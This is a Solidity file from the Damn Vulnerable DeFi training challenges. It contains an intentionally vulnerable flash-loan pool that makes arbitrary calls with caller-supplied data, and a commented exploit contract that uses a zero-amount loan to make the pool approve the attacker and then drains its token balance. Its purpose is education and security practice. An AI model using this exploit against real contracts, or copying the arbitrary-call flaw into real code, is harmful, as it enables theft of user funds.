// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        // this should not be the line to exploit
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        // this line of code allow the attacker to call a low-level call with arbitrary data
        // function call invokes on the target passed in
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract TrusterExploiter {
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);
        uint256 poolBalance = token.balanceOf(_pool);

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);

        // _token as the target, will call the data which is an approve function on ERC20
        // this calls the approve function with this contract's address and the poolBalance
        // ERC20 approve function approves the spender on behalf of msg.sender, which is the TrusterLenderPool
        // flash loan amount is 0 means that we are not borrowing/repaying anything
        // borrower is the message sender which is not too relevant
        pool.flashLoan(0, msg.sender, _token, data);

        // checks the allowance of the sender to the recipient
        // transfers the tokens from pool to msg sender
        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}